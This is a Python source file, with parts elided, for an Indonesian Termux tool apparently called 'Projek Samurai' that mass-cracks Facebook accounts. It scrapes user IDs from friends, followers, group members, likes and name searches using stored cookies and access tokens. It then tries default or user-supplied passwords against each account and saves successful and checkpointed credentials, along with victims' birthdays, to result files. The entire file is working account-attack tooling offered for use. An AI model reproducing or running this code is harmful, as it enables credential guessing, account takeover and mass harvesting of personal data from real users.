...
if insta !=0:os.system('pkg install play-audio -y')
try:os.mkdir("dump")
except:pass
try:os.mkdir("Hasil")
except:pass
...
╚════██║    ██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████║    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ {Q}\033[44m\033[1;37m Options  \033[41m\033[1;37m Login \x1b[0m\n""")
...
def login():
  ...
  try:
    ...
    print('%s║'%(B));jalan('%s╚══[%s!%s] %sLogin Berhasil, Jalan Kembali Scrip Nya'%(K,P,K,P));time.sleep(2);exit()
  except KeyError:
...
\x1b[1;94m────────────────────────────────────────────────────                                                               
   \033[44m\033[1;37m Script information  \033[41m\033[1;37m Version 1.1 \x1b[0m\n
 Author   : {P}Fikri Syahputra Sinaga {Q}
 Coded    : {P}Projek Samurai{Q}
 ...
 """)
	...
	def mani(self):
		...
		try:
			...
			idz = json.loads(get.text)['id']
		except:
			os.system('rm -rf .login.txt')
			os.system('rm -rf .cookie.txt')
			jalan(" |-->Cookie Kadaluarsa");time.sleep(0.25)
 ...
 Status         : {II}Premium{Q}
 ▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️ Informasi Pengguna ◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️ """)
		print(f'⏩ 01.Crack public and friends({O}Massal{Q}){II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 02.Crack public and friends {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 03.Crack Dari Followers {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 04.Crack Followers Id  ({O}Ultimate Dump{Q}){II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 05.Crack From Name Search ({O}No Login{Q}){II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 06.Crack From Like Posts {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 07.Crack From File {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 08.Crack From Comments {M}OFF{Q}');time.sleep(0.25)
		print(f'⏩ 09.Crack From Member Group {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 10.Crack from Saran Teamn {M}OFF{Q}');time.sleep(0.25)
		print(f'⏩ 11.Check Number of Friends ({O}Prone Check Point{Q}){M}OF{Q}');time.sleep(0.25)
		print(f'⏩ 12.View Crack Results {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 13.Check Facebook Options Crack Results {M}OF{Q}');time.sleep(0.25)
		print(f'⏩ 14.Auto Share Bots {M}OF{Q}');time.sleep(0.25)
		print(f'⏩ 15.Laporkan Bung {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 16.Info Cookie {II}ON{Q}');time.sleep(0.25)
		print(f'⏩ 17.See Related Applications Through Crack Results {M}OF{Q}');time.sleep(0.25)
		print(f'⏩ 18.Setting User Agent');time.sleep(0.25)
		print(f'⏩ 00.LOGOUT({M}Hapus Cookie{Q})');time.sleep(0.25)
		print(f'▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️');time.sleep(0.25)
	...
	def public_mass(self):
		...
		try:
			tanya_total = int(input(war+"Mau Dump Berapa ID Bang? : "))
		except:tanya_total=1
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.txt','w') 
		jalan(" -->Type >"+I+"me"+Q+"< Untuk Dump ID Publik Massal")
		print(" ")
		print(f"[{M}!{Q}]-->{O}Masukkan ID Atau Username{Q}")
		print(" ")
		for t in range(tanya_total):
			...
			try:
				if idt == "me":idt = "me"
					...
					payload = {"fburl": "https://m.facebook.com/{}".format(idt), "check": "Lookup"}
					if "facebook" in idt:
			...
			try:
				if idt == "me" or "me" == idt:
					otw = requests.get("https://graph.facebook.com/me/?access_token=%s"%(idt,token),cookies=cookie)
					op = json.loads(otw.text)
				else:
					jok = requests.get("https://graph.facebook.com/"+idt+"?access_token=%s"%(token),cookies=cookie)
			...
			jalan(" -->Nama   : "+I+nama+Q)
			try:
				dump = open('dump/'+namafi+'.txt','a+') 
				r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token=%s"%(token),cookies=cookie)
	...
	def public_(self):
		try:
			...
			os.system("rm -rf .token.txt")
			os.system("rm -rf .cookie.txt")
			exit(war+"Cookie Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.txt','w') 
		jalan(" -->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" ")
		print(f"[{M}!{Q}]-->{O}Masukkan User ID Atau Username{Q}")
		print(" ")
		idt = input(" -->Target :")
		try:
			if idt == "me":idt = "me"
		...
		if id_ == "0" or "0" == id_:
			...
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".txt"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
	...
	def follow_(self):
		...
		try:
			dump = open('dump/'+namafi+'.txt','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token=%s"%(token),cookies=cookie).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
	...
	def dump_follow_ulti(self):
		...
		try:
			...
			print(" |-->Total ID : %s"%(len(open("dump/"+namafi+".txt","r").readlines())))
		except:pass
		try:
			i = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token=%s"%(token),cookies=cookie).json()["paging"]["next"]
			self.ke_situ(i, namafi)
		except:pass
		id_ = ("%s"%(len(open("dump/"+namafi+".txt","r").readlines())))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".txt"+Q)
	...
	def ke_situ(self, xnha, namaf):
		...
		print(" |-->Total ID : %s"%(len(open("dump/"+namaf+".txt","r").readlines())))
		try:
	...
	def pencarian_nologin(self):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.txt','w')
		jalan(" |-->Hasil Dump Dari Pencarian Nama DiSimpan : "+O+"dump/"+namafi+".txt"+Q)
			...
			for x in r.find_all('td'):
				try:
					...
					for uid,nama in data:
						...
						id.append(uid+'<=>'+nama)
						open('dump/'+namfi+'.txt','a+').write(uid+'<=>'+nama+'\n')
	...
	def likes_(self):
		...
		try:
			dump = open('dump/'+namafi+'.txt','a+')
			for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token),cookies=cookie).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
	...
	def menu_grup(self):
		...
		if qiw in (""," "):
			...
			self.ambil_diri_sendiri(open(".token.txt","r").read())
			os.sys.exit()
		else:
	...
	def manual_(self):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.txt','w')
		jalan(" |-->Hasil Dump Dari Grup DiSimpan : "+O+"dump/"+namafi+".txt"+Q)
		try:
			cookie = {'cookie':open('.cookie.txt','r').read()}
		except:
			jalan(" |-->Maaf Anda Belum Login Cookies... Anda Menuju Login Cokies")
		...
		try:
			...
			for dev in members.find_all("table"):
				try:
					...
					open('dump/'+nama_fi+'.txt','a+').write(str(user_)+'<=>'+str(nama_)+'\n')
					sys.stdout.write(f"\r |-->Sedang Mengumpulkan {O}{len(id)}{Q} Idz..."),
					sys.stdout.flush()
				except:pass
	...
	def ambil_diri_sendiri(self,token,cookie):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.txt','w')
		jalan(" |-->Hasil Dump Dari Grup DiSimpan : "+O+"dump/"+namafi+".txt"+Q)
		try:
		...
		no = 0
		try:
			for i in ses.get("https://graph.facebook.com/me/groups?access_token=%s"%(token),cookies=cookie).json()["data"]:
				try:
	...
	def cek_jumlah_teman(self):
		...
		try:
			...
			r = requests.get("https://graph.facebook.com/"+idt+"?fields=friends.fields(id,name)&access_token="+(token),cookies=cookie)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
				uid = i["id"]
				nama = i["name"]
	...
	def lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			r = requests.get("https://graph.facebook.com/"+ml+"?fields=friends.fields(id,name)&access_token=%s"%(token),cookies=cookie)
			z = json.loads(r.text)["friends"]
			for i in z["data"]:
			...
			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token=%s"%(token),cookies=cookie).json()["data"]:
	...
	def proses_(self, token, idz, opostt):
		...
		dancok=requests.post(f"https://graph.facebook.com/me/feed?link="+idz+"&published=0&access_token=%s"%(token),cookies=cookie,headers=h1).text
		if 'id' in dancok:
	...
	def share_post(self):
		...
		def cept_(idpost):
			...
			cookie = {'cookie':open('.cookie.txt','r').read()}
			try:
				requests.get('https://graph.facebook.com/v2.0/me/feed?method=post&privacy={"value":"EVERYONE"}&message=&link=https://mbasic.facebook.com/'+str(idpost)+'&access_token='+str(token),cookies=cookie)
			except:pass
		try:
			token = open('.token.txt','r').read()
			cookie = {'cookie':open('.cookie.txt','r').read()}
	...
	def hide_tkn(self):
		try:
			...
			exit(war+"Cookie Failed !!");time.sleep(2)
		try:
			vv = ses.get("https://graph.facebook.com/me?access_token=%s"%(token),cookie=cookie)
...
class crackmenu:
	...
	def menu_crack(self):   # METHOD AUTO PASSWROD
		...
		print(' ')
		jalan("▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️ Pilih Methode ◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️◀️")
		print(Q+"⏩ 1. B-Api Free (V1)");time.sleep(0.02)
		print(Q+"⏩ 2. Mobile (V2)");time.sleep(0.02)
		print(Q+"⏩ 3. Mobile V3 ("+II+"Direkomendasikan V4"+Q+")");time.sleep(0.02)
	...
	def menu_crack_m(self):   # METHOD MANUAL PASSWORD
		jalan(war+"Silahkan Pilih Methode Login !")
		print(' |')
		jalan("▶️ Mainkan Mode Pesawat Selama 5 Detik Jika Tidak Ada Hasil")
		print(Q+"⏩ 1. Mobile V1 ");time.sleep(0.02)
		print(' |')
	def pro_ses(self):
		print('▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️▶️')
		jalan(f" |-->Results Crack CP Saved : {K}Results/CP-{O}{durasi}{K}.txt{Q}|")
	...
	def passmenu(self,isifile):
		...
		cjj = open(".paww", "w")
		print('|')
		print('▶️ you want to use manual password :')
		print('▶️ Manual/Default')
		print(' |')
		zk = input('▶️ select (M/D): ')
		print(" |")
		if zk in ('m','M','Manual','manual'):
			while True:
				jalan(war+"Contoh Password : sayang,123456")
				pwx = input("▶️ Input Password : ")
				jalan("%sPassword Yang DiGunakan : %s%s"%(war,I,pwx))
				if pwx == '':jalan("▶️ Isi Password Dengan Benar !!")
				elif len(pwx)<=5:jalan("▶️ Password Minimal 6 Huruf !!")
		...
		if "" == "":
			for pw in kiky__gtg:
				...
				if 'c_user' in session.cookies.get_dict():
					...
					cek_cookies_by_risky(user, coki, zczc);os.popen('play-audio data/ok.mp3')
					break
				elif 'checkpoint' in session.cookies.get_dict():
					try:token = open('.token.txt','r').read();cookie = {'cookie':open('.cookie.txt','r').read()};cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,token),cookies=cookie).json()['birthday'];month, day, year = cp_ttl.split('/');month = bulan_ttl[month];print('\r%s |-->%s%s|%s|%s %s %s       ' % (Q,K,user,pw,day,month,year));wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);break
					except (KeyError, IOError):month = '';day   = '';year  = ''
					except:pass
					print('\r%s |-->%s%s|%s                 ' % (Q,K,user,pw));wrt = '%s|%s' % (user,pw);cp.append(wrt);open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt);os.popen('play-audio data/cp.mp3')
					break
				else:continue
			loop += 1
...
class Main_:
	...
	def __check_update_(self, version_):
		try:
			version = requests.get("https://github.com/Hamii-king-06/OLD/main/Approval.txt").text.strip()
	...
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://github.com/Hamii-king-06/OLD/main/Approval.txt").text.strip()
		except requests.exceptions.ConnectionError:
			os.sys.exit(" |-->Jaringan Anda Down")
		if mainx == mainz:pass
		else:
